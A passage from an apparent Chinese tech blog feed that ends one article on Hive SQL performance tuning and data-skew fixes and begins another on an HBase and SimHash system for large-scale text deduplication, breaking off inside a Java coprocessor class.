=b.user_id;</p><p>调优结果：原先由于数据倾斜导致运行时长超过 1 小时，解决方法 1 运行每日平均时长 25 分钟，解决方法 2 运行的每日平均时长在 20 分钟左右。优化效果很明显。</p><p>我们在工作中总结出：解决方法2比解决方法1效果更好，不但IO少了，而且作业数也少了。解决方法1中log读取两次，job 数为2。解决方法2中 job 数是1。这个优化适合无效 id（比如-99、 ‘’，null 等）产生的倾斜问题。把空值的 key 变成一个字符串加上随机数，就能把倾斜的 数据分到不同的Reduce上，从而解决数据倾斜问题。因为空值不参与关联，即使分到不同 的 Reduce 上，也不会影响最终的结果。附上 Hadoop 通用关联的实现方法是：关联通过二次排序实现的，关联的列为 partion key，关联的列和表的 tag 组成排序的 group key，根据 pariton key分配Reduce。同一Reduce内根据group key排序。</p><h3 id="4-3不同数据类型关联产生的倾斜问题"><a href="#4-3不同数据类型关联产生的倾斜问题" class="headerlink" title="4.3不同数据类型关联产生的倾斜问题"></a><strong>4.3不同数据类型关联产生的倾斜问题</strong></h3><p>问题：不同数据类型 id 的关联会产生数据倾斜问题。</p><p>一张表 s8 的日志，每个商品一条记录，要和商品表关联。但关联却碰到倾斜的问题。 s8 的日志中有 32 为字符串商品 id，也有数值商品 id，日志中类型是 string 的，但商品中的 数值 id 是 bigint 的。猜想问题的原因是把 s8 的商品 id 转成数值 id 做 hash 来分配 Reduce， 所以字符串 id 的 s8 日志，都到一个 Reduce 上了，解决的方法验证了这个猜测。</p><p>解决方法：把数据类型转换成字符串类型</p><p>SELECT * FROM s8_log a LEFT OUTERJOIN r_auction_auctions b ON a.auction_id=CASE(b.auction_id AS STRING)</p><p>调优结果显示：数据表处理由 1 小时 30 分钟经代码调整后可以在 20 分钟内完成。</p><h3 id="4-4利用Hive对UNION-ALL优化的特性"><a href="#4-4利用Hive对UNION-ALL优化的特性" class="headerlink" title="4.4利用Hive对UNION ALL优化的特性"></a><strong>4.4利用Hive对UNION ALL优化的特性</strong></h3><p>多表 union all 会优化成一个 job。</p><p>问题：比如推广效果表要和商品表关联，效果表中的 auction_id 列既有 32 为字符串商 品 id，也有数字 id，和商品表关联得到商品的信息。</p><p>解决方法：Hive SQL 性能会比较好</p><p>SELECT * FROM effect a</p><p>JOIN</p><p>(SELECT auction_id AS auction_id FROM auctions</p><p>UNION All</p><p>SELECT auction_string_id AS auction_id FROM auctions) b</p><p>ON a.auction_id=b.auction_id</p><p>比分别过滤数字 id，字符串 id 然后分别和商品表关联性能要好。</p><p>这样写的好处：1 个 MapReduce 作业，商品表只读一次，推广效果表只读取一次。把 这个 SQL 换成 Map/Reduce 代码的话，Map 的时候，把 a 表的记录打上标签 a，商品表记录 每读取一条，打上标签 b，变成两个&lt;key,value&gt;对，&lt;(b,数字 id),value&gt;，&lt;(b,字符串 id),value&gt;。</p><p>所以商品表的 HDFS 读取只会是一次。</p><h3 id="4-5解决Hive对UNION-ALL优化的短板"><a href="#4-5解决Hive对UNION-ALL优化的短板" class="headerlink" title="4.5解决Hive对UNION ALL优化的短板"></a><strong>4.5解决Hive对UNION ALL优化的短板</strong></h3><p>Hive 对 union all 的优化的特性：对 union all 优化只局限于非嵌套查询。</p><ul><li>消灭子查询内的 group by</li></ul><p>示例 1：子查询内有 group by</p><p>SELECT * FROM</p><p>(SELECT <em> FROM t1 GROUP BY c1,c2,c3 UNION ALL SELECT </em> FROM t2 GROUP BY c1,c2,c3)t3</p><p>GROUP BY c1,c2,c3</p><p>从业务逻辑上说，子查询内的 GROUP BY 怎么都看显得多余（功能上的多余，除非有 COUNT(DISTINCT)），如果不是因为 Hive Bug 或者性能上的考量（曾经出现如果不执行子查询 GROUP BY，数据得不到正确的结果的 Hive Bug）。所以这个 Hive 按经验转换成如下所示：</p><p>SELECT <em> FROM (SELECT </em> FROM t1 UNION ALL SELECT * FROM t2)t3 GROUP BY c1,c2,c3</p><p>调优结果：经过测试，并未出现 union all 的 Hive Bug，数据是一致的。MapReduce 的 作业数由 3 减少到 1。</p><p>t1 相当于一个目录，t2 相当于一个目录，对 Map/Reduce 程序来说，t1，t2 可以作为 Map/Reduce 作业的 mutli inputs。这可以通过一个 Map/Reduce 来解决这个问题。Hadoop 的 计算框架，不怕数据多，就怕作业数多。</p><p>但如果换成是其他计算平台如 Oracle，那就不一定了，因为把大的输入拆成两个输入， 分别排序汇总后 merge（假如两个子排序是并行的话），是有可能性能更优的（比如希尔排 序比冒泡排序的性能更优）。</p><ul><li>消灭子查询内的 COUNT(DISTINCT)，MAX，MIN。</li></ul><p>SELECT * FROM</p><p>(SELECT * FROM t1</p><p>UNION ALL SELECT c1,c2,c3 COUNT(DISTINCT c4) FROM t2 GROUP BY c1,c2,c3) t3</p><p>GROUP BY c1,c2,c3;</p><p>由于子查询里头有 COUNT(DISTINCT)操作，直接去 GROUP BY 将达不到业务目标。这时采用 临时表消灭 COUNT(DISTINCT)作业不但能解决倾斜问题，还能有效减少 jobs。</p><p>INSERT t4 SELECT c1,c2,c3,c4 FROM t2 GROUP BY c1,c2,c3;</p><p>SELECT c1,c2,c3,SUM(income),SUM(uv) FROM</p><p>(SELECT c1,c2,c3,income,0 AS uv FROM t1</p><p>UNION ALL</p><p>SELECT c1,c2,c3,0 AS income,1 AS uv FROM t2) t3</p><p>GROUP BY c1,c2,c3;</p><p>job 数是 2，减少一半，而且两次 Map/Reduce 比 COUNT(DISTINCT)效率更高。</p><p>调优结果：千万级别的类目表，member 表，与 10 亿级得商品表关联。原先 1963s 的任务经过调整，1152s 即完成。</p><ul><li>消灭子查询内的 JOIN</li></ul><p>SELECT * FROM</p><p>(SELECT <em> FROM t1 UNION ALL SELECT </em> FROM t4 UNION ALL SELECT * FROM t2 JOIN t3 ON t2.id=t3.id) x</p><p>GROUP BY c1,c2;</p><p>上面代码运行会有 5 个 jobs。加入先 JOIN 生存临时表的话 t5，然后 UNION ALL，会变成 2 个 jobs。</p><p>INSERT OVERWRITE TABLE t5</p><p>SELECT * FROM t2 JOIN t3 ON t2.id=t3.id;</p><p>SELECT * FROM (t1 UNION ALL t4 UNION ALL t5);</p><p>调优结果显示：针对千万级别的广告位表，由原先 5 个 Job 共 15 分钟，分解为 2 个 job 一个 8-10 分钟，一个3分钟。</p><h3 id="4-6GROUP-BY替代COUNT-DISTINCT-达到优化效果"><a href="#4-6GROUP-BY替代COUNT-DISTINCT-达到优化效果" class="headerlink" title="4.6GROUP BY替代COUNT(DISTINCT)达到优化效果"></a><strong>4.6GROUP BY替代COUNT(DISTINCT)达到优化效果</strong></h3><p>计算 uv 的时候，经常会用到 COUNT(DISTINCT)，但在数据比较倾斜的时候 COUNT(DISTINCT) 会比较慢。这时可以尝试用 GROUP BY 改写代码计算 uv。</p><ul><li>原有代码</li></ul><p>INSERT OVERWRITE TABLE s_dw_tanx_adzone_uv PARTITION (ds=20120329)SELECT 20120329 AS thedate,adzoneid,COUNT(DISTINCT acookie) AS uv FROM s_ods_log_tanx_pv t WHERE t.ds=20120329 GROUP BY adzoneid</p><p>关于COUNT(DISTINCT)的数据倾斜问题不能一概而论，要依情况而定，下面是我测试的一组数据：</p><p>测试数据：169857条</p><p>#统计每日IP</p><p>CREATE TABLE ip_2014_12_29 AS SELECT COUNT(DISTINCT ip) AS IP FROM logdfs WHERE logdate=’2014_12_29′;</p><p>耗时：24.805 seconds</p><p>#统计每日IP（改造）</p><p>CREATE TABLE ip_2014_12_29 AS SELECT COUNT(1) AS IP FROM (SELECT DISTINCT ip from logdfs WHERE logdate=’2014_12_29′) tmp;</p><p>耗时：46.833 seconds</p><p>测试结果表名：明显改造后的语句比之前耗时，这是因为改造后的语句有2个SELECT，多了一个job，这样在数据量小的时候，数据不会存在倾斜问题。</p><h2 id="5-优化总结"><a href="#5-优化总结" class="headerlink" title="5.优化总结"></a><strong>5.优化总结</strong></h2><p>优化时，把hive sql当做mapreduce程序来读，会有意想不到的惊喜。理解hadoop的核心能力，是hive优化的根本。这是这一年来，项目组所有成员宝贵的经验总结。</p><ul><li>长期观察hadoop处理数据的过程，有几个显著的特征:</li></ul><ol><li>不怕数据多，就怕数据倾斜。</li><li>对jobs数比较多的作业运行效率相对比较低，比如即使有几百行的表，如果多次关联多次汇总，产生十几个jobs，没半小时是跑不完的。map reduce作业初始化的时间是比较长的。</li><li>对sum，count来说，不存在数据倾斜问题。</li><li>对count(distinct ),效率较低，数据量一多，准出问题，如果是多count(distinct )效率更低。</li></ol><ul><li>优化可以从几个方面着手：</li></ul><ol><li>好的模型设计事半功倍。</li><li>解决数据倾斜问题。</li><li>减少job数。</li><li>设置合理的map reduce的task数，能有效提升性能。(比如，10w+级别的计算，用160个reduce，那是相当的浪费，1个足够)。</li><li>自己动手写sql解决数据倾斜问题是个不错的选择。set hive.groupby.skewindata=true;这是通用的算法优化，但算法优化总是漠视业务，习惯性提供通用的解决方法。 Etl开发人员更了解业务，更了解数据，所以通过业务逻辑解决倾斜的方法往往更精确，更有效。</li><li>对count(distinct)采取漠视的方法，尤其数据大的时候很容易产生倾斜问题，不抱侥幸心理。自己动手，丰衣足食。</li><li>对小文件进行合并，是行至有效的提高调度效率的方法，假如我们的作业设置合理的文件数，对云梯的整体调度效率也会产生积极的影响。</li></ol><p>优化时把握整体，单个作业最优不如整体最优。</p><h2 id="6-优化的常用手段"><a href="#6-优化的常用手段" class="headerlink" title="6.优化的常用手段"></a><strong>6.优化的常用手段</strong></h2><p><strong>主要由三个属性来决定：</strong></p><ul><li>hive.exec.reducers.bytes.per.reducer   ＃这个参数控制一个job会有多少个reducer来处理，依据的是输入文件的总大小。默认1GB。</li><li>hive.exec.reducers.max    ＃这个参数控制最大的reducer的数量， 如果 input / bytes per reduce &gt; max  则会启动这个参数所指定的reduce个数。  这个并不会影响mapre.reduce.tasks参数的设置。默认的max是999。</li><li>mapred.reduce.tasks ＃这个参数如果指定了，hive就不会用它的estimation函数来自动计算reduce的个数，而是用这个参数来启动reducer。默认是-1。</li></ul><h3 id="6-1参数设置的影响"><a href="#6-1参数设置的影响" class="headerlink" title="6.1参数设置的影响"></a><strong>6.1参数设置的影响</strong></h3><p>如果reduce太少：如果数据量很大，会导致这个reduce异常的慢，从而导致这个任务不能结束，也有可能会OOM 2、如果reduce太多：  产生的小文件太多，合并起来代价太高，namenode的内存占用也会增大。如果我们不指定mapred.reduce.tasks， hive会自动计算需要多少个reducer。</p><p>转载自：<a href="https://mp.weixin.qq.com/s/9V99Dgz_yp-CPMtFFATtXw" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> Hive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于HBase构建千亿级文本数据相似度计算与快速去重系统</title>
      <link href="/2019/03/12/hbase/ji-yu-hbase-gou-jian-qian-yi-ji-wen-ben-shu-ju-xiang-si-du-ji-suan-yu-kuai-su-qu-chong-xi-tong/"/>
      <url>/2019/03/12/hbase/ji-yu-hbase-gou-jian-qian-yi-ji-wen-ben-shu-ju-xiang-si-du-ji-suan-yu-kuai-su-qu-chong-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="基于HBase构建千亿级文本数据相似度计算与快速去重系统"><a href="#基于HBase构建千亿级文本数据相似度计算与快速去重系统" class="headerlink" title="基于HBase构建千亿级文本数据相似度计算与快速去重系统"></a>基于HBase构建千亿级文本数据相似度计算与快速去重系统</h1><blockquote><p><strong>前言</strong>：随着大数据时代的到来，数据信息在给我们生活带来便利的同时，同样也给我们带来了一系列的考验与挑战。本文主要介绍了基于 Apache HBase 与 Google SimHash 等多种算法共同实现的一套支持百亿级文本数据相似度计算与快速去重系统的设计与实现。该方案在公司业务层面彻底解决了多主题海量文本数据所面临的存储与计算慢的问题。</p></blockquote><h2 id="一-面临的问题"><a href="#一-面临的问题" class="headerlink" title="一. 面临的问题"></a>一. 面临的问题</h2><h3 id="1-如何选择文本的相似度计算或去重算法？"><a href="#1-如何选择文本的相似度计算或去重算法？" class="headerlink" title="1. 如何选择文本的相似度计算或去重算法？"></a>1. 如何选择文本的相似度计算或去重算法？</h3><p>常见的有余弦夹角算法、欧式距离、Jaccard 相似度、最长公共子串、编辑距离等。这些算法对于待比较的文本数据不多时还比较好用，但在海量数据背景下，如果每天产生的数据以千万计算，我们如何对于这些海量千万级的数据进行高效的合并去重和相似度计算呢？</p><h3 id="2-如何实现快速计算文本相似度或去重呢？"><a href="#2-如何实现快速计算文本相似度或去重呢？" class="headerlink" title="2. 如何实现快速计算文本相似度或去重呢？"></a>2. 如何实现快速计算文本相似度或去重呢？</h3><p>如果我们选好了相似度计算和去重的相关算法，那我们怎么去做呢？如果待比较的文本数据少，我们简单遍历所有文本进行比较即可，那对于巨大的数据集我们该怎么办呢？遍历很明显是不可取的。</p><h3 id="3-海量数据的存储与快速读写"><a href="#3-海量数据的存储与快速读写" class="headerlink" title="3. 海量数据的存储与快速读写"></a>3. 海量数据的存储与快速读写</h3><h2 id="二-SimHash-算法引入"><a href="#二-SimHash-算法引入" class="headerlink" title="二. SimHash 算法引入"></a>二. SimHash 算法引入</h2><p>基于问题一，我们引入了 <strong>SimHash 算法</strong> 来实现海量文本的相似度计算与快速去重。下面我们简单了解下该算法。</p><h3 id="1-局部敏感哈希"><a href="#1-局部敏感哈希" class="headerlink" title="1. 局部敏感哈希"></a>1. 局部敏感哈希</h3><p>在介绍 SimHash 算法之前，我们先简单介绍下局部敏感哈希是什么。</p><p>局部敏感哈希的基本思想类似于一种空间域转换思想，LSH 算法基于一个假设，如果两个文本在原有的数据空间是相似的，那么分别经过哈希函数转换以后的它们也具有很高的相似度；相反，如果它们本身是不相似的，那么经过转换后它们应仍不具有相似性。</p><p>局部敏感哈希的最大特点就在于保持数据的相似性，举一个小小的例子说明一下：对A文章微调后我们称其为B文章（可能只是多了一个<strong>的</strong>字），如果此时我们计算两篇文章的 MD5 值，那么必将大相径庭。而局部敏感哈希的好处是经过哈希函数转换后的值也只是发生了微小的变化，即如果两篇文章相似度很高，那么在算法转换后其相似度也会很高。</p><p>MinHash 与 SimHash 算法都属于局部敏感哈希，一般情况若每个 Feature 无权重，则 MinHash 效果优于 SimHash 有权重时 SimHash 合适。长文本使用 Simhash 效果很好，短文本使用 Simhash 准备度不高。</p><h3 id="2-SimHash-算法"><a href="#2-SimHash-算法" class="headerlink" title="2. SimHash 算法"></a>2. SimHash 算法</h3><p>SimHash 是 Google 在2007年发表的论文《Detecting Near-Duplicates for Web Crawling 》中提到的一种指纹生成算法或者叫指纹提取算法，被 Google 广泛应用在亿级的网页去重的 Job 中，其主要思想是<strong>降维</strong>，经过simhash降维后，可能仅仅得到一个长度为32或64位的二进制由01组成的字符串。而一维查询则是非常快速的。</p><p>SimHash的工作原理我们这里略过，大家可以简单理解为：我们可以利用SimHash算法为每一个网页/文章生成一个长度为32或64位的二进制由01组成的字符串（向量指纹），形如：1000010010101101111111100000101011010001001111100001001011001011。</p><h3 id="3-海明距离"><a href="#3-海明距离" class="headerlink" title="3. 海明距离"></a>3. 海明距离</h3><p>两个码字的对应比特取值不同的比特数称为这两个码字的海明距离。在一个有效编码集中,任意两个码字的海明距离的最小值称为该编码集的海明距离。举例如下：10101和00110从第一位开始依次有第一位、第四、第五位不同，则海明距离为3。</p><p><strong>在 google 的论文给出的数据中，64位的签名，在海明距离为3的情况下，可认为两篇文档是相似的或者是重复的，当然这个值只是参考值。</strong></p><p>这样，基于 SimHash 算法，我们就可以将百亿千亿级的高维特征文章转变为一维字符串后再通过计算其海明距离判断网页/文章的相似度，可想效率必将大大提高。</p><h2 id="三-效率问题"><a href="#三-效率问题" class="headerlink" title="三. 效率问题"></a>三. 效率问题</h2><p>到这里相似度问题基本解决，但是按这个思路，在海量数据几百亿的数量下，效率问题还是没有解决的，因为数据是不断添加进来的，不可能每来一条数据，都要和全库的数据做一次比较，按照这种思路，处理速度会越来越慢，线性增长。</p><p>这里，我们要引入一个新的概念：<strong>抽屉原理</strong>，也称鸽巢原理。下面我们简单举例说一下：</p><p>桌子上有四个苹果，但只有三个抽屉，如果要将四个苹果放入三个抽屉里，那么必然有一个抽屉中放入了两个苹果。如果每个抽屉代表一个集合，每一个苹果就可以代表一个元素，假如有n+1个元素放到n个集合中去，其中必定有一个集合里至少有两个元素。</p><p>抽屉原理就是这么简单，那如果用它来解决我们海量数据的遍历问题呢？</p><p>针对海量数据的去重效率，我们可以将64位指纹，切分为4份16位的数据块，<strong>根据抽屉原理在海明距离为3的情况，如果两个文档相似，那么它必有一个块的数据是相等的。</strong></p><p>那也就是说，我们可以以某文本的 SimHash 的每个16位截断指纹为 Key，Value 为 Key 相等时文本的 SimHash 集合存入 K-V 数据库即可，查询时候，精确匹配这个指纹的4个16位截断指纹所对应的4个 SimHash 集合即可。</p><p>如此，假设样本库，有2^37 条数据（1375亿数据），假设数据均匀分布，则每个16位（16个01数字随机组成的组合为2^16 个）倒排返回的最大数量为<br>(2^37)<em>4/(2^16)=8388608个候选结果，4个16位截断索引，总的结果为：4</em>8388608=33554432，<strong>约为3356万</strong>，通过<br>这样一来的降维处理，<strong>原来需要比较1375亿次，现在只需要比较3356万次即可得到结果</strong>，这样以来大大提升了计算效率。</p><p>根据网上测试数据显示，普通 PC 比较1000万次海明距离大约需要 300ms，也就是说3356万次（1375亿数据）只需花费3356/1000*0.3=1.0068s。那也就是说对于<strong>千亿级</strong>文本数据（如果每个文本1kb，约<strong>100TB</strong>数据）的相似度计算与去重工作我们最多只需要<strong>一秒</strong>的时间即可得出结果。</p><h2 id="四-HBase-存储设计"><a href="#四-HBase-存储设计" class="headerlink" title="四. HBase 存储设计"></a>四. HBase 存储设计</h2><p>饶了这么大一周，我们终于将需要讲明的理论知识给大家过了一遍。为了阐述的尽量清晰易懂，文中很多理论知识的理解借鉴了大量博主大牛的博客，<strong>原文链接已在文末附上</strong>，有不太明白的地方快快跪拜大牛们的博客吧，哈哈！</p><p>下面我们着重介绍一下 HBase 存储表的设计与实现。</p><p>基于上文我们可以大概知道，如果将64位指纹平分四份，<strong>海明距离取3，那么必有一段16位截取指纹的数据是相等的</strong>。而每一段16位截取指纹对应一个64位指纹集合，且该集合中的每个64位指纹必有一段16位截取指纹与该段16位截取指纹重合。我们可以简单表示(以8位非01指纹举例)为：</p><table><thead><tr><th>key</th><th>value(set)</th></tr></thead><tbody><tr><td>12</td><td>[12345678,12345679]</td></tr><tr><td>23</td><td>[12345678,12345679,23456789]</td></tr></tbody></table><p>那如果基于 HBase 去实现的话，我们大概对比<strong>三种</strong>可能的设计方案。</p><h3 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h3><p>以 16 位指纹作为 HBase 数据表的行键，将每一个与之可能相似的64位指纹作为 HBase 的列，列值存文章id值，即<strong>构建一张大宽表</strong>。如下表所示(以8位非01指纹举例)：</p><table><thead><tr><th>rowkey</th><th>column1</th><th>column2</th><th>column3</th><th>…</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr></tbody></table><p>实际数据表可能是这个样子：</p><table><thead><tr><th>rowkey</th><th>12345678</th><th>32234567</th><th>23456789</th><th>12456789</th><th>…</th></tr></thead><tbody><tr><td>12</td><td>1102101</td><td></td><td></td><td>1102102</td><td>…</td></tr><tr><td>23</td><td></td><td>1102104</td><td>1102105</td><td></td><td>…</td></tr><tr><td>34</td><td>1102106</td><td></td><td></td><td></td><td>…</td></tr></tbody></table><p>那其实这样设计表的话该 HBase 表 Rowkey 的个数就是一个确定的数值：16个01数字随机组成的组合为2^16 个。也就是共2^16=65536行。 列的个数其实也是固定的，即2^64=<strong>184467440737亿万列</strong>。</p><p>此时，比如说我们比较56431234与库中所有文本的相似度，只需拉去rowkey in (56,43,12,34) 四行数据遍历每行列，由于 HBase 空值不进行存储，所有只会遍历存在值的列名。</p><p>由上文我们计算出1350亿数据如果平均分布的话每行大约有<strong>839万列</strong>，且不说我们的数据量可能远远大于千亿级别，也不说以64位字符串作为列名所占的存储空间有多大，单单千亿级数据量 HBase 每行就大约839万列，虽说HBase号称支持千万行百万列数据存储，但总归还是设计太不合理。数据不会理想化均匀分布，总列数高达184467440737亿万列也令人堪忧。</p><h3 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h3><p>以 16 位指纹与64位指纹拼接后作为 HBase 数据表的行键，该表只有一列，列值存文章id值，即<strong>构建一张窄长表</strong>。如下表所示(以8位非01指纹举例)：</p><table><thead><tr><th>rowkey</th><th>id</th></tr></thead><tbody><tr><td>124</td><td>456</td></tr></tbody></table><p>实际数据表可能是这个样子：</p><table><thead><tr><th>rowkey</th><th>id</th></tr></thead><tbody><tr><td>12_12345678</td><td>1</td></tr><tr><td>34_12345678</td><td>1</td></tr><tr><td>56_12345678</td><td>1</td></tr><tr><td>78_12345678</td><td>1</td></tr><tr><td>34_22345678</td><td>2</td></tr><tr><td>23_12235678</td><td>3</td></tr></tbody></table><p>如此设计感觉要比第一种方法要好一些，每一篇文章会被存为四行。但同样有诸多缺点，一是 Rowkey 过长，二是即便我们通过某种转变设计解决了问题一，那获取数据时我们也只能将 Get 请求转为四个Scan并发扫描+StartEnKey 去扫描表获取数据。当然，如果想实现顺序扫描还可能存在热点问题。在存储上，也造成了数据大量冗余。</p><h3 id="方案三："><a href="#方案三：" class="headerlink" title="方案三："></a>方案三：</h3><p>在真实生产环境中，我们采取该方案来避免上述两个方案中出现的问题与不足。下面简单介绍一下（<strong>如果您有更好更优的方案，欢迎留言，先表示感谢！</strong>）</p><p>简言之呢，就是自己在 HBase 端维护了一个 Set 集合（<strong>协处理器</strong>），并以 Json 串进行存储，格式如下：</p><pre><code>{    &quot;64SimHash1&quot;:&quot;id1&quot;,    &quot;64SimHash2&quot;:&quot;id2&quot;,    ...    ...}</code></pre><p>基于公司存在多种主题类型的文本数据，且互相隔离，去重与相似度计算也是分主题进行，我们的 Rowkey 设计大致如下：</p><p>Rowkey (共24位)：HashNumber_ContentType_16SimHash </p><ul><li>HashNumber： 为防热点，对表进行Hash预分区（64个预分区），占2个字符<br>计算公式如下：<strong>String.format(“%02x”, Math.abs(key.hashCode()) % 64)</strong></li><li>ContentType ：内容主题类型，占4个字符</li><li>16SimHash： 16位 SimHash 截取指纹，由01组成</li></ul><p>表结构大致如下：</p><table><thead><tr><th>rowkey</th><th>si</th><th>s0</th><th>s1</th><th>s2</th><th>s3</th><th>…</th></tr></thead><tbody><tr><td>01_news_010101010101010101</td><td>value</td><td>1</td><td>Json 串</td><td></td><td></td><td>…</td></tr><tr><td>02_news_010101010101010110</td><td>value</td><td>2</td><td>Json 串</td><td>Json 串</td><td></td><td>…</td></tr><tr><td>03_news_100101010101010110</td><td>value</td><td>3</td><td>Json 串</td><td>Json 串</td><td>Json 串</td><td>…</td></tr><tr><td>01_xbbs_010101010101010101</td><td>value</td><td>1</td><td>Json 串</td><td></td><td></td><td>…</td></tr></tbody></table><p>si：客户端传递过来的欲存储的值，由64位 Simhash 与 Id 通过双下划线拼接而成，诸如 Simhash__Id 的形式。<br>s0：记录该行数据共有多少个 Set 集合，每一个 Set 集合存储<strong>10000</strong>个K-V对儿（约1MB）。<br>s1：第一个 Set 集合，Json 串存储，如果 Size &gt; 10000 ，之后来的数据将存入s2。<br>s2：以此类推。</p><p>当然最核心的部分是s1/s2/s3 中 Json 串中要<strong>排重</strong>。最简单的办法无非是每次存入数据前先将所有 Set 集合中的数据读到客户端，将欲存的数据与集合中所有数据比对后再次插入。这将带来大量往返IO开销，影响写性能。因此，我们在此引入了 HBase 协处理器技术来规避这个问题，即在服务端完成所有排重操作。大致代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>learn<span class="token punctuation">.</span>share<span class="token punctuation">.</span>scenarios<span class="token punctuation">.</span>observers<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>gson<span class="token punctuation">.</span>Gson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>gson<span class="token punctuation">.</span>JsonObject<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>Cell<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>CellUtil<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>CoprocessorEnvironment<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>Durability<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>Get<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>Put<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>Result<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>coprocessor<span class="token punctuation">.</span>BaseRegionObserver<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>coprocessor<span class="token punctuation">.</span>ObserverContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>coprocessor<span class="token punctuation">.</span>RegionCoprocessorEnvironment<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>regionserver<span class="token punctuation">.</span>wal<span class="token punctuation">.</span>WALEdit<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Bytes<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Logger<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>LoggerFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** *  基于协处理器构建百亿级文本去重系统 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HBaseSimHashSetBuildSystem</span> <span class="token keyword">extends</span> <span class="token class-name">BaseRegionObserver</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Logger logger <span class="token operator">=</span> LoggerFactory<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>HBaseSimHashSetBuildSystem<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span>CoprocessorEnvironment e<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Coprocessor opration start..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     *     * @param e     * @param put     * @param edit     * @param durability     * @throws IOException     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">prePut</span><span class="token punctuation">(</span>ObserverContext<span class="token operator">&lt;</span>RegionCoprocessorEnvironment<span class="token operator">></span> e<span class="token punctuation">,</span> Put put<span class="token punctuation">,</span> WALEdit edit<span class="token punctuation">,</span> Durability durability<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// test flag</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"do something before Put Opration..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Cell<span class="token operator">></span> cells <span class="token operator">=</span> put<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"si"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   